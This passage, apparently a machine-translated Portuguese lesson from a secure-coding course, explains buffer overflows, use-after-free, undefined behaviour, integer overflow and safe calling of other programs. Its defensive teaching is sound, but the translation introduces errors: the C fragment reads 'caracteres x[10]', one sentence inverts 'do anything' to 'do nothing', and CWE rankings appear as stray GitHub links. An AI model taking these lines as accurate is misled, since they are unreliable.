armazenamento são frequentemente chamadas de <em>buffers</em>. Ler e escrever dentro desse buffer é aceitável. Mas o que acontece quando seu programa tenta ler ou escrever nesse buffer, mas tenta fazer isso fora do intervalo dessa área de armazenamento? Por exemplo, aqui está um fragmento trivial de um programa em C que aloca um array <strong>x</strong> de tamanho 10 (valores de índice de 0 a 9) e, posteriormente, armazena o valor de <strong>y</strong> no valor de índice <strong>i</strong> desse array:</p> <p><strong>caracteres x[10]; ... x[i] = y;</strong></p> <p>O que acontece se o valor de i estiver fora dos limites (ou seja, tiver um valor diferente de 0 a 9)? Existem duas opções comuns e seguras que ocorrem em diferentes linguagens de programação:</p> <ul> <li><strong>Redimensionar</strong> Em muitas linguagens de programação, tentar escrever (ou ler) fora dos limites redimensionará o array para que o valor possa ser armazenado ou lido.</li> <li><strong>Erro</strong> Em algumas linguagens, particularmente aquelas focadas em desempenho excelente, um erro (geralmente uma exceção) será relatado se o índice estiver fora dos limites.</li> </ul> <p>Infelizmente, existe uma terceira opção: uma leitura ou gravação fora dos limites pode ser aceita e se transformar em uma potencial vulnerabilidade de segurança. Se você usa uma linguagem insegura para memória, como C, C++ ou linguagem assembly, qualquer leitura ou gravação que possa sair dos limites é uma vulnerabilidade de segurança potencialmente perigosa. Esse problema também pode ocorrer se a linguagem for normalmente segura para memória, mas você desabilitar as verificações de segurança de memória da linguagem (como Rust, C# e Ada).</p> <p>Em C, qualquer tentativa de ler ou escrever fora dos limites de um buffer (por meio de um índice de array ou um ponteiro) é um exemplo de <em>comportamento indefinido</em>. Se um programa em C eventualmente executar uma instrução que causará um comportamento indefinido, o código poderá fazer qualquer coisa a qualquer momento — mesmo antes da instrução que causou o comportamento indefinido! Você pode encontrar mais informações nas seguintes referências:</p> <ul> <li><em><a href=https://raphlinus.github.io/programming/rust/2018/08/17/undefined-behavior.html>Com comportamento indefinido, tudo é possível</a></em> (2018), de Raph Levien</li> <li><em><a href="https://devblogs.microsoft.com/oldnewthing/20140627-00/?p=633">Comportamento indefinido pode resultar em viagem no tempo (entre outras coisas, mas a viagem no tempo é a mais estranha)</a></em> (2014), por Raymond Chen</li> <li><em><a href=http://blog.regehr.org/archives/213>Um guia para comportamento indefinido em C e C++ (partes 1-3)</a></em> (2010), por John Regehr</li> </ul> <p>Na <em>prática</em> , se não houver segurança de memória, uma gravação fora de um buffer na maioria das implementações de linguagens de programação frequentemente acaba corrompendo estruturas de dados internas das quais o programa depende. Por exemplo, pode sobrescrever variáveis ​​locais e/ou alterar o que será executado após o retorno de uma função. Da mesma forma, uma leitura fora de um buffer frequentemente revela informações internas que normalmente não são reveladas, incluindo segredos dos quais a segurança (como chaves ou sistemas de proteção) depende. Além disso, se for C ou C++, os compiladores frequentemente usarão tais instruções como uma licença para gerar algum código de máquina muito surpreendente (porque os autores do compilador podem presumir que tais coisas não acontecerão). Os invasores aprimoraram sua arte ao longo de décadas para explorar essas vulnerabilidades, porque elas são comuns e muitas vezes podem transformar rapidamente a descoberta desse tipo de vulnerabilidade em um ataque devastador.</p> <p>Existem muitos nomes para esses ataques, com terminologia e significados variados. Uma das variações mais comuns dessa vulnerabilidade é quando o invasor consegue escrever além do final de um array, e essa vulnerabilidade às vezes é chamada de vulnerabilidade <em>clássica de estouro de buffer</em>. Um ataque que explora essa vulnerabilidade gravando dados fora de um buffer é frequentemente chamado de <em>ataque de destruição de pilha</em> (se o buffer estiver na pilha, como por ser um parâmetro local) ou <em>ataque de destruição de heap</em> (se o buffer estiver no heap, ou seja, foi alocado anteriormente por <strong>new</strong> ou <strong>malloc</strong> , dependendo da linguagem). O CWE tem vários identificadores e nomes, incluindo <a href=https://cwe.mitre.org/data/definitions/119.html>CWE-119</a> ( <em>Restrição Imprópria de Operações dentro dos Limites de um Buffer de Memória</em> ), que é um caso especial de <a href=https://cwe.mitre.org/data/definitions/118.html>CWE-118</a> ( <em>Acesso Incorreto de Recurso Indexável ('Erro de Intervalo')</em> ).</p> <h1 id=leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-ii>Leituras/gravações fora dos limites e estouro de buffer II<a class=headerlink href=#leiturasgravacoes-fora-dos-limites-e-estouro-de-buffer-ii title="Permanent link">¶</a></h1> <p>Se um invasor fizer com que seu programa grave fora do buffer, isso geralmente resulta em uma vulnerabilidade séria, na qual o invasor pode fazer com que o programa não faça nada.</p> <p>Gravações ilimitadas não são o único problema. Historicamente, as pessoas se preocupavam mais com gravações fora dos limites do que com leituras, mas a vulnerabilidade Heartbleed, em 2014, mostrou que leituras fora dos limites também podem ser extremamente perigosas. Leituras fora dos limites podem revelar informações que permitem que invasores invadam completamente um sistema. Mesmo programas que permitem apenas um byte de uma leitura ou gravação fora dos limites podem ter uma vulnerabilidade perigosa.</p> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/j8wbvqajfu2r-image.png><img alt="Heartbleed Explicado" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/j8wbvqajfu2r-image.png></a></p> <p><strong>Heartbleed Explicado</strong>. Obtido em <a href=https://xkcd.com/1354/ >xkcd.com</a> , licenciado sob <a href=https://creativecommons.org/licenses/by-nc/2.5/ >CC-BY-NC-2.5</a></p> <h1 id=solucoes-para-leituras-e-gravacoes-fora-dos-limites>Soluções para leituras e gravações fora dos limites<a class=headerlink href=#solucoes-para-leituras-e-gravacoes-fora-dos-limites title="Permanent link">¶</a></h1> <p>Se você estiver curioso, existem muitos artigos e cursos universitários que se aprofundam sobre exatamente por que esse problema é tão perigoso. Mas, se você está apenas desenvolvendo software, esses detalhes não importam – você só precisa garantir que as leituras e gravações estejam sempre dentro dos limites do que deveriam se referir. Então, como podemos fazer isso?</p> <p>A solução mais simples: <em><strong>sempre, quando prático, use linguagens com segurança de memória e mantenha a segurança de memória ativada</strong></em>. Quase todas as linguagens de programação são seguras em memória, pelo menos por padrão. Se você tentar acessar um buffer fora de seus limites em uma linguagem com segurança de memória, o buffer será redimensionado ou ocorrerá um erro (normalmente uma exceção). Em ambos os casos, o sistema não cede o controle a um invasor. Essa solução é mais fácil de aplicar quando você está escrevendo código do zero, é claro.</p> <p>Mas às vezes isso não é prático. Isso significa que você nunca poderia usar C, C++ ou a linguagem assembly. Também significaria que você nunca poderia desabilitar a segurança de memória em outras linguagens. Existem muitos programas grandes em C ou C++ que seriam difíceis de reescrever e, claro, há razões para as pessoas escolherem essas linguagens. A maioria dos kernels de sistemas operacionais é escrita em C, pois são críticos para o desempenho e C foi projetado especificamente para essa tarefa. Da mesma forma, em linguagens que permitem desabilitar a segurança de memória, há razões para esses mecanismos existirem.</p> <p>Se você <em>precisar</em> ter código sem segurança de memória, tente limitar o que é inseguro para a memória onde for prático. Por exemplo, em linguagens que são seguras para a memória por padrão, mas têm mecanismos para desativá-la, você deve minimizar a quantidade de código que é executado sem segurança de memória. Uma grande biblioteca em Rust, C# ou Ada deve ser quase totalmente segura, com no máximo uma pequena porção insegura. Se você tiver muito código C ou C++ existente, considere reescrever uma parte em uma linguagem segura para a memória. Se você reescrever uma parte, normalmente deve se concentrar na parte <em>mais perigosa</em> (ou seja, código que é mais exposto a invasores). Por exemplo, o navegador Firefox da Mozilla foi escrito principalmente em C++ (e algum JavaScript), mas em 2017 parte desse código C++ foi substituído por implementações em Rust, e cada vez mais o Firefox é escrito em Rust (Mozilla <em><a href=https://wiki.mozilla.org/Oxidation>Oxidation</a></em> e <em><a href="https://docs.google.com/spreadsheets/d/1flUGg6Ut4bjtyWdyH_9emD9EAN01ljTAVft2S4Dq620/edit#gid=885787479">Rust vs. C++ no macOS Firefox Nightly</a></em> ).</p> <p>Se você tiver que programar sem verificações de segurança de memória, por qualquer motivo, precisará implementar cuidadosamente todas as verificações no próprio código. Por segurança, você deve garantir que nunca cometerá um erro: você deve garantir que todas as referências estejam dentro dos limites, não importa o que o invasor faça. Cada verificação não é difícil de fazer; isso não é ciência de foguetes. O problema é que nunca cometer um erro é difícil. Você pode ser muito inteligente e ainda assim cometer um erro. Se você escrever software sem verificações de segurança de memória, sempre que possível, você deve usar mecanismos como ferramentas e revisão por pares para reduzir os riscos de algo escapar aos usuários. Mais adiante, em**Parte 3**<em>Verificação e tópicos mais especializados</em> <strong>,</strong> discutiremos algumas das ferramentas disponíveis para ajudar.</p> <p>Claro, apenas fazer uma verificação não é suficiente — o que fazer quando a verificação falha? A atitude mais segura é rejeitar a entrada e não executar nenhuma ação se uma verificação falhar ao longo do caminho. No entanto, muitas vezes é difícil fazer a rejeição, e por isso os desenvolvedores ficam tentados a simplesmente cortar qualquer excesso (ou escrever código que faça isso acidentalmente). Às vezes, isso é aceitável, mas muitas vezes significa que um invasor pode controlar o que permanece no buffer e o que não permanece. Isso às vezes pode levar a vulnerabilidades, e determinar se há uma vulnerabilidade pode ser muito difícil.</p> <p>Se você usa C, existem muitos padrões que são especialmente vulneráveis, incluindo o uso de funções como <strong>strcpy()</strong> para copiar uma string, <strong>strcat()</strong> para concatenar uma string e loops que adicionam incrementos a um buffer. No início do desenvolvimento da linguagem C, foram criadas funções que limitavam onde os dados seriam gravados, especificamente ****strncpy()**** e <strong>strncat()</strong>. No entanto, usar ****strncpy()**** e <strong>strncat()</strong> exige um recálculo constante do <em>espaço restante</em> , dificultando seu uso correto (é extremamente fácil ter um erro de "desvio de um" neste código que só os invasores percebem). A função <strong>strncpy()</strong> também sobrescreve todo o espaço restante, tornando-a absurdamente ineficiente na maioria das circunstâncias.</p> <p>Se você usa C, às vezes pode usar funções mais seguras. A função <strong>snprintf()</strong> em C grava a saída em um buffer de strings com um formato específico e não sobrescreve além de um determinado comprimento. A função <strong>memccpy()</strong> permite fazer uma cópia simples, novamente sem ultrapassar um comprimento máximo. No entanto, nesses casos, você não pode simplesmente chamar a função — na maioria dos casos, também é preciso verificar o valor de retorno para ver se houve um estouro e, se houve, fazer algo sensato (que geralmente é interromper o processamento da entrada). As funções <strong>asprintf()</strong> e <strong>vasprintf()</strong> permitem realocar uma nova string, que pode ser usada para redimensionar uma string. Como sempre, você deve garantir que libere quaisquer strings alocadas anteriormente quando elas não forem mais usadas e que as libere apenas uma vez (um problema que discutiremos mais em breve). Se você não estiver preparado para fazer isso com muito cuidado e método, provavelmente não deveria usar C.</p> <p>Os compiladores modernos para essas linguagens e os sistemas operacionais que as suportam utilizam uma variedade de técnicas de proteção para dificultar a exploração desses ataques. Medidas de proteção amplamente aplicadas incluem:</p> <ul> <li>Randomização de Layout de Espaço de Endereço (ASLR) Randomiza onde os objetos são armazenados na memória, dificultando que invasores ataquem alguns objetos (nos compiladores gcc e clang, pode ser necessário habilitar o modo PIE, por exemplo, usando <strong>-fPIE</strong> ).</li> <li>Memória não executável Garanta que a memória com instruções executáveis ​​não possa ser gravada ao mesmo tempo, tornando um pouco mais difícil para invasores modificarem o software ou introduzirem seu próprio código malicioso.</li> <li>Canários Inserem uma verificação extra em funções selecionadas; antes de retornarem, elas fazem uma verificação de integridade em um valor chamado "guard" ou "canário" que detecta certos tipos de estouros de buffer que realizam gravações (os compiladores gcc e clang podem fazer isso com opções, como <strong>-fstack-protector</strong> ).</li> <li>Inserções de limites automatizadas Modifique o código durante a compilação para fazer a verificação de limites, mesmo que não tenha sido solicitado originalmente (os compiladores gcc e clang podem fazer isso com a opção <strong>-D_FORTIFY_SOURCE=2</strong> ).</li> </ul> <p>Se você estiver escrevendo código que não é seguro para a memória, ou chamando código que não é seguro para a memória, certifique-se de que medidas de proteção como essas estejam habilitadas sempre que possível, inclusive na compilação, nos testes e na produção. A boa notícia é que medidas de proteção como essas retardarão alguns exploits. Mas, no final das contas, medidas de proteção geralmente não <em>impedem</em> exploits. Na melhor das hipóteses, essas medidas de proteção transformam "assumir o controle do programa" em "o programa para de funcionar"... e esse é o <em>melhor</em> caso. A única maneira de não ter código vulnerável... é não ter código vulnerável.</p> <h2 id=liberacao-dupla-uso-apos-liberacao-e-liberacao-ausente>Liberação dupla, uso após liberação e liberação ausente<a class=headerlink href=#liberacao-dupla-uso-apos-liberacao-e-liberacao-ausente title="Permanent link">¶</a></h2> <p>Leituras e gravações fora dos limites não são o único problema para programas escritos em linguagens como C ou C++.</p> <p>Ao processar informações, normalmente é necessário alocar memória (por exemplo, com "new") e usá-la por um tempo. A maioria das linguagens de programação rastreia automaticamente quando você não precisa mais usar memória e a recupera; esse processo é chamado de <em>coleta automática de lixo</em> ou <em>gerenciamento automatizado de memória</em> (usaremos o último termo). Existem diferentes maneiras de realizar o gerenciamento automatizado de memória (as mais comuns são contagem ou rastreamento de referências), e a terminologia varia, mas a questão é que, na maioria das linguagens de programação, isso é feito automaticamente para você.</p> <p>Mas em algumas linguagens de programação, você precisa liberar memória <em>manualmente</em> ao terminar de usá-la. Em particular, isso se aplica a C ( <strong>free</strong> ) e C++ ( <strong>delete</strong> ). Se você esquecer de liberar a memória ao terminar de usá-la, isso leva a um "vazamento de memória"; o programa usará cada vez mais memória. Em algumas situações, esse uso crescente de memória pode levar a um desempenho cada vez pior ou a uma falha, que é uma perda de disponibilidade.</p> <p>Frequentemente, o problema de segurança mais importante é liberar manualmente a região da memória <em>mais</em> de uma vez; isso é chamado de <em>liberação dupla</em>. Outro grande problema de segurança é <em>o uso após a liberação</em> , ou seja, usar a memória após ela ter sido liberada. Em linguagens com segurança de memória, uma liberação dupla ou uso após a liberação não ocorre. No entanto, uma liberação dupla ou uso após a liberação em um programa C ou C++ frequentemente corrompe a infraestrutura de baixo nível e pode alterar o valor de valores do programa que <em>parecem</em> não estar relacionados.</p> <p>Se um invasor conseguir fazer com que seu programa seja liberado duas vezes ou use-after-free, isso pode resultar em uma vulnerabilidade grave, na qual o invasor pode fazer com que o programa execute qualquer ação. Isso ocorre porque esses erros geralmente permitem que um invasor corrompa e controle a infraestrutura na qual seu programa é executado.</p> <p>A solução óbvia é usar apenas linguagens de programação nas quais não seja necessário liberar memória manualmente. A maioria das linguagens de programação gerencia a memória automaticamente.</p> <p>Nos casos em que isso não for prático, simplifique seu código o máximo possível para que fique claro onde a desalocação ocorrerá, de modo que ela ocorra exatamente uma vez e você nunca mais a utilize. Considere definir ponteiros como <strong>NULL (0)</strong> quando terminar de usar o que eles apontam. Isso reduzirá o risco de liberá-los ou usá-los novamente mais tarde e, se desnecessário, muitas dessas atribuições serão otimizadas pelo compilador.</p> <h2 id=evite-comportamento-indefinido>Evite comportamento indefinido<a class=headerlink href=#evite-comportamento-indefinido title="Permanent link">¶</a></h2> <p>Muitas linguagens de programação são definidas em algum tipo de especificação formal. Quando for esse o caso, e sempre que possível, você deve tentar escrever código que esteja em conformidade com essas especificações, pois seu código tem maior probabilidade de funcionar em todos os casos e, à medida que as implementações da linguagem mudam, é mais provável que ele continue funcionando.</p> <p>Às vezes, essas especificações permitem uma dentre várias opções diferentes (isso às vezes é chamado de "comportamento não especificado" ou "comportamento específico do compilador"). Normalmente, você deve tentar escrever seu código de forma que, independentemente da opção permitida usada, ele continue funcionando. Linguagens que suportam threading permitem que as threads sejam executadas em paralelo e em ordem arbitrária. Em muitas linguagens, a ordem das operações em uma chamada como <strong>f(aa, bb, cc)</strong> não é definida (ou seja, não garante que <strong>aa</strong> ou <strong>cc</strong> seja computado primeiro). Cuidado ao depender do que suas ferramentas fazem atualmente, pois quando elas são atualizadas, o que elas fazem pode mudar. Para muitos desenvolvedores, lidar com isso já é algo natural.</p> <p>No entanto, algumas linguagens (como C e C++) possuem construções com <em>comportamento verdadeiramente indefinido</em>. Ou seja, se você tomar certas ações, a especificação não garante <em>absolutamente nada</em>. Por exemplo, o <a href=http://c-faq.com/ansi/undef.html>FAQ de C</a> observa que, com comportamento indefinido, <em>"Qualquer coisa pode acontecer; o Padrão não impõe requisitos. O programa pode falhar na compilação, ou pode ser executado incorretamente (travando ou gerando silenciosamente resultados incorretos), ou pode, fortuitamente, fazer exatamente o que o programador pretendia."</em></p> <p>Qualquer comportamento indefinido pode ser — e frequentemente é — uma vulnerabilidade de segurança. Mesmo que não seja uma vulnerabilidade de segurança hoje, uma pequena atualização em suas ferramentas, sistema operacional ou configuração pode transformá-la em uma vulnerabilidade.</p> <p>Muitas linguagens têm pelo menos alguns comportamentos indefinidos e, portanto, se você usa essas linguagens, precisa aprender o que são e evitá-los. C e C++ têm um número especialmente grande de comportamentos indefinidos. Por exemplo, para C, existem centenas de comportamentos indefinidos; a lista tem 11 páginas no rascunho final disponível publicamente do <a href=https://web.archive.org/web/20181230041359if_/http://www.open-std.org/jtc1/sc22/wg14/www/abq/c17_updated_proposed_fdis.pdf>anexo J.2 do C18</a>. Também é muito fácil em C e C++ escrever acidentalmente código com comportamento indefinido. Já vimos alguns exemplos de comportamento indefinido: leituras e gravações fora dos limites de um buffer, uso após liberação e liberações duplas. Aqui estão mais alguns.</p> <p>Em C e C++, uma desreferência de ponteiro nulo também é indefinida (por exemplo, avaliando " ***p** " quando <strong>p</strong> é <strong>NULL</strong> ). Isso significa que uma tentativa de desreferenciar um ponteiro nulo não leva necessariamente à tentativa de ler um valor inválido; o programa pode fazer qualquer <em>coisa</em>.</p> <p><strong>Observação:</strong> <em>a desreferência de ponteiro NULL</em> ( <a href=https://cwe.mitre.org/data/definitions/476.html>CWE-476</a> ) é uma causa tão comum de vulnerabilidades de segurança que está no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/15 title="GitHub Issue: squidfunk/mkdocs-material #15">#15</a> de 2021 e no CWE Top 25 <a class="magiclink magiclink-github magiclink-issue" href=https://github.com/squidfunk/mkdocs-material/issues/14 title="GitHub Issue: squidfunk/mkdocs-material #14">#14</a> de 2019.</p> <p>Em C e C++, o estouro de inteiros com sinal é indefinido (por exemplo, um <strong>int</strong> com valor <strong>MAX_INT</strong> ao qual se adiciona 1). Não há garantia de que inteiros com sinal sejam encapsulados; em vez disso, o programa pode fazer qualquer coisa.</p> <p>Talvez agora esteja claro por que muitas pessoas recomendam evitar C e C++ se o código precisa ser seguro. Por vários motivos, é mais difícil escrever software seguro nessas linguagens! Mas, novamente, há <em>motivos</em> pelos quais as pessoas escolhem essas linguagens e, claro, se algo já está escrito nessas linguagens, é difícil mudar.</p> <p>Portanto, se você usa C e C++, existem maneiras de reduzir seus riscos. Já discutimos algumas opções. Aqui estão mais algumas:</p> <ul> <li>Leia seus padrões cuidadosamente para conhecer todos os comportamentos comuns indefinidos e evitá-los ativamente ao escrever código.</li> <li>Ative avisos sobre comportamentos indefinidos. Exemplos de sinalizadores gcc e/ou clang incluem <strong>-fsanitize=signed-overflow</strong> (avisa sobre estouro de sinal), <strong>-ftrapv</strong> (captura estouros de inteiros com sinal), ****-fsanitize=address**** , <strong>-fsanitize=undefined</strong> e <strong>-fcatch-undefined-behavior</strong> (mas nem SEMPRE os detectará!).</li> <li>Força o compilador a atribuir um significado a comportamentos oficialmente indefinidos. Você não deve confiar neles, mas eles reduzirão o impacto de cometer um erro. Exemplos dessas flags gcc e/ou clang incluem <strong>-fwrapv</strong> (envolve inteiros em caso de estouro), <strong>-fno-delete-null-pointer-checks</strong> e <strong>-fno-strict-overflow</strong>.</li> </ul> <p>Mais tarde, discutiremos o uso de ferramentas para tentar detectá-los, mas fique atento: a maioria das ferramentas, na melhor das hipóteses, detecta <em>alguns</em> comportamentos indefinidos, não todos. Sua melhor defesa é usar uma linguagem com poucos ou nenhum comportamento indefinido. Quando isso não for razoável, saiba exatamente o que não está definido e escreva o código cuidadosamente para que ele não dependa de comportamentos indefinidos.</p> <h1 id=evite-estouro-wraparound-e-underflow-de-inteiros>Evite estouro, wraparound e underflow de inteiros<a class=headerlink href=#evite-estouro-wraparound-e-underflow-de-inteiros title="Permanent link">¶</a></h1> <p>É comum calcular números inteiros em programas, como incrementar continuamente (adicionando 1 a) uma variável. No entanto, nenhum computador consegue realmente lidar com um número infinito de dígitos. De fato, muitas linguagens de programação usam um número fixo de bits em seus tipos inteiros mais comuns, portanto, os números inteiros mínimo e máximo têm um intervalo muito menor do que o que <em>poderia</em> ser representado pelo computador.</p> <p>Se um invasor conseguir fazer com que um cálculo inteiro exceda o intervalo de representação do inteiro, o resultado pode ser uma vulnerabilidade. Como cálculos inteiros são comuns e os desenvolvedores frequentemente esquecem que os computadores não conseguem lidar com um número infinito de dígitos, essa é uma vulnerabilidade relativamente comum.</p> <p>Como já observamos, em C e C++, você deve escrever seu programa de forma que um invasor não possa causar estouro ou subfluxo de inteiros com sinal comuns (como <strong>int</strong> ). Um estouro ou subfluxo de inteiros com sinal normalmente é um comportamento indefinido em C e C++, e o programa pode fazer qualquer coisa quando isso ocorre (incluindo disparar uma vulnerabilidade).</p> <p>Em C e C++, o estouro ou o estouro de um inteiro sem sinal envolve sua representação subjacente (tipicamente em complemento de dois). Portanto, em C e C++, é típico que adicionar 1 ao maior valor sem sinal representável produza 0. Em muitas outras linguagens de programação, inteiros com e sem sinal são armazenados em um tipo de comprimento fixo e seus valores se envolvem em estouro e estouro de valor (tipicamente em complemento de dois). Isso nem sempre é bom; se um invasor puder causar um estouro ou estouro de valor, ocorre um wraparound e, se o programa não foi projetado para lidar com isso, o resultado pode frequentemente ser uma vulnerabilidade.</p> <p>Algumas linguagens de programação alternam automaticamente para formatos inteiros de "números grandes" conforme necessário para suportar um número arbitrário de dígitos, em vez de usar um número fixo de bits para representar um inteiro. Essas linguagens de programação incluem Python, Ruby e Scheme. Muitas outras linguagens de programação oferecem suporte a esses formatos, por exemplo, por meio de uma biblioteca, embora você possa precisar solicitar especificamente o uso desse formato (por exemplo, como um tipo). Esses formatos não suportam um número infinito de dígitos, já que nenhum computador tem memória infinita, mas isso reduz bastante o risco de tais problemas. Em muitos casos, uma exceção é gerada se o cálculo ficar sem espaço, portanto, certifique-se de que o programa possa lidar com essa exceção corretamente. Um problema comum é que os programas frequentemente precisam chamar uma rotina escrita em uma linguagem de programação diferente e, durante essa conversão, o número pode ser convertido para um formato de largura fixa que não pode armazenar o valor (recriando assim o problema).</p> <p>A linguagem de programação JavaScript é um caso incomum. A especificação JavaScript, chamada ECMAScript, não oferece suporte direto para números inteiros. Em vez disso, os números inteiros são normalmente representados usando números de ponto flutuante. Conforme observado na especificação da linguagem ECMAScript (seção <em>"O Tipo Numérico"</em> ), isso significa que o tipo numérico do JavaScript pode representar com precisão todos os números inteiros matemáticos positivos e negativos cuja magnitude não seja maior que 2 53. No entanto, se um invasor conseguir fazer com que os números inteiros calculados ultrapassem esse intervalo, coisas estranhas podem acontecer. Por exemplo, incrementar um número inteiro positivo além desse valor provavelmente produzirá um resultado inalterado, já que o tipo subjacente não pode armazenar todos os dígitos. Existem também alguns operadores que lidam apenas com números inteiros em intervalos específicos (como -2 31 a 2 31 -1 inclusive, ou 0 a 2 16 -1 inclusive); certifique-se de que um invasor não consiga fazer com que esses intervalos sejam excedidos antes de chamar esses operadores. Para obter mais informações, consulte a <a href=https://www.ecma-international.org/publications-and-standards/standards/ecma-262/ >Especificação da Linguagem ECMAScript® 2021</a> da ECMA.</p> <p>Uma das maneiras mais simples de garantir que um invasor não possa acionar vulnerabilidades de estouros e subfluxos de números inteiros é realizar a validação de entrada em todos os números não confiáveis. Em todas essas verificações de validação de entrada, imponha valores mínimos e máximos em todos os números inteiros não confiáveis ​​para que as entradas aceitas não levem a um cálculo que acione um estouro ou subfluxo de números inteiros. Se isso for feito, não poderá haver tais vulnerabilidades. Se isso não for possível, o programa precisará detectar estouros e subfluxos de números inteiros que podem ser acionados por um invasor, antes ou depois do cálculo, e tratá-los adequadamente.</p> <h1 id=introducao-aos-programas-de-chamada-segura-i>Introdução aos programas de chamada segura I<a class=headerlink href=#introducao-aos-programas-de-chamada-segura-i title="Permanent link">¶</a></h1> <p>Pouquíssimos programas são totalmente autocontidos; Quase todos os programas chamam outros programas. Isso inclui programas locais, como programas fornecidos pelo sistema operacional, bibliotecas de software integradas para a linguagem e software de repositórios de pacotes (como npm, PyPI e maven).</p> <p>Sistemas modernos frequentemente chamam outros serviços por meio de uma rede, fazendo solicitações por meio de diversas APIs (como APIs REST e GraphQL) e recebendo dados em formatos como JSON e XML. Quase todos esses programas então chamam outros programas. Muitas vezes, essas chamadas indiretas não são óbvias (por exemplo, chamar uma biblioteca escrita por outra pessoa) ou envolvem uma grande quantidade de infraestrutura "oculta".</p> <p>Você precisa ter cuidado com os programas que escolhe usar (confiar) e gerenciá-los (por exemplo, como você os registra e atualiza). Depois de escolhê-los, você deve ter cuidado com a forma como usa esses outros programas. Nesta seção, falaremos sobre o <em>uso</em> seguro de outros programas.</p> <p>Primeiro, o óbvio: se um programa é sabidamente inseguro e a segurança é importante, então não o utilize! Mas, normalmente, você não está usando um programa sabidamente inseguro, então vamos além disso.</p> <p>Se houver uma maneira relativamente fácil de limitar os privilégios da rotina que você está chamando, faça-a. Se você puder <em>limitar</em> os privilégios concedidos, então, se um invasor conseguir invadir, o dano será mais limitado e poderá dificultar que o invasor cause mais danos. Este é outro exemplo do princípio de segurança do menor privilégio. Por exemplo, se você estiver chamando um banco de dados, tente limitar os privilégios do programa que faz a solicitação. Se estiver usando SQL, considere usar o comando <strong>GRANT</strong> para que o programa solicitante tenha menos privilégios.</p> <p>Um princípio útil é chamar uma rotina apenas com valores válidos. Se uma rotina exige que um número seja de 0 a 9, então não deve ser possível para um invasor fazer com que 50 seja enviado. Isso é mais fácil na teoria do que na prática, especialmente porque esses limites nem sempre são bem documentados. Mas, caso você saiba de alguma limitação, considere fazer algumas verificações para garantir que ela seja respeitada ou escreva seu programa de forma que as limitações sejam necessariamente respeitadas.</p> <p>Um princípio muito importante é que, se uma rotina for difícil de usar com segurança e houver outra maneira de realizar a tarefa que seja mais fácil de fazer com segurança, <em>use a rotina que for mais fácil de usar com segurança</em>. Aqui estão alguns sinais de alerta de que você está usando uma rotina difícil de usar com segurança:</p> <ul> <li>Ele executa qualquer programa que lhe seja enviado, e alguns dados que você envia podem vir de um invasor. Qualquer rotina com nomes como <strong>eval()</strong> , <strong>exec()</strong> , <strong>execute()</strong> ou <strong>system()</strong> tem grandes chances de estar nessa categoria. Por exemplo, não use <strong>eval()</strong> em JavaScript para processar dados JSON (em geral!); use algo mais seguro, como a função <strong>JSON.parse()</strong> do JavaScript.</li> <li>Exige que você concatene strings constantes com dados que possam vir de um invasor. Geralmente, esses outros dados de um ataque precisam ser escapados, e é fácil cometer um erro ao escapar dados.</li> <li>Seu formato de entrada é descrito usando uma especificação de linguagem (como o Backus-Naur Form).</li> <li>Ele foi criado para interação humana direta, não para ser invocado por um programa.</li> </ul> <p>Você <em>pode</em> usar essas rotinas com segurança, e às vezes precisa. Mas se puder evitá-las, seu programa provavelmente será mais seguro — e provavelmente mais fácil de manter também. Se não puder evitá-las, convém encapsular seu uso em wrappers especiais para facilitar o uso seguro.</p> <h1 id=introducao-aos-programas-de-chamada-segura-ii>Introdução aos Programas de Chamada Segura II<a class=headerlink href=#introducao-aos-programas-de-chamada-segura-ii title="Permanent link">¶</a></h1> <p>Por que certos tipos de rotinas são difíceis de usar com segurança? Um problema comum é que muitas rotinas aceitam linguagens com <em>metacaracteres</em> — ou seja, caracteres que alteram a forma como outros caracteres são interpretados, em vez de serem dados em si. Por exemplo, o caractere de aspas duplas ( <strong>"</strong> ) costuma ser um metacaractere (inclusive em SQL e shell).</p> <p>Se houver uma especificação de linguagem, isso quase certamente significa que existem metacaracteres. O suporte a metacaracteres é muito flexível e, se toda a entrada for confiável, não há problema. Mas quando partes dos dados podem ser de um invasor, é preciso ter muito cuidado e tomar precauções extras. Se um invasor conseguir inserir metacaracteres na entrada e eles não forem escapados corretamente, vulnerabilidades perigosas e facilmente exploradas geralmente surgem se forem lidas por algum tipo de interpretador. Esses tipos de ataques às vezes são chamados de ataques de injeção.</p> <p>Portanto, você precisa garantir que, ao enviar dados para algum programa (ou saída), você os envie de forma segura. Isso pode envolver:</p> <ul> <li><strong>Sanitização</strong> Remoção de qualquer caractere ilegal ou potencialmente malicioso (geralmente metacaracteres) dos dados.</li> <li><strong>Escapar</strong> Modificar caracteres (alguns metacaracteres) para que não sejam interpretados incorretamente.</li> <li><strong>Normalização</strong> Alterar a forma dos dados para que se tornem um formato comum (e, como efeito colateral, evitar que isso cause um problema de segurança).</li> </ul> <p>Sempre que possível, use bibliotecas e APIs que façam isso por você; elas são mais fáceis de usar com segurança.</p> <p>Vamos agora examinar alguns casos comuns de ataques de injeção e como lidar com eles com segurança.</p> <p>Novamente, uma vulnerabilidade de injeção ocorre quando um programa aceita dados de um invasor e os entrega indevidamente a um interpretador de comandos.</p> <p>Alguns dos problemas mais comuns ocorrem quando esses dados são enviados a um sistema de banco de dados (ataques de injeção de SQL) ou a um interpretador de comandos do sistema operacional (ataques de injeção de comandos do SO), portanto, vamos nos concentrar neles.</p> <p>Depois de entender como lidar com esses dois casos comuns, ficará muito mais claro como lidar adequadamente com outros interpretadores que não abordaremos aqui (por exemplo, o Lightweight Directory Access Protocol (LDAP)). Começaremos discutindo o envio de dados para sistemas de banco de dados, que frequentemente são vulneráveis ​​a ataques de injeção de SQL.</p> <h1 id=vulnerabilidade-de-injecao-de-sql>Vulnerabilidade de injeção de SQL<a class=headerlink href=#vulnerabilidade-de-injecao-de-sql title="Permanent link">¶</a></h1> <p><a class=glightbox data-desc-position=bottom data-height=auto data-type=image data-width=80% href=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/sh14yb97jinm-image.png><img alt="Façanhas de uma mãe" src=https://d36ai2hkxl16us.cloudfront.net/course-uploads/e0df7fbf-a057-42af-8a1f-590912be5460/sh14yb97jinm-image.png></a></p> <p>A maioria dos sistemas 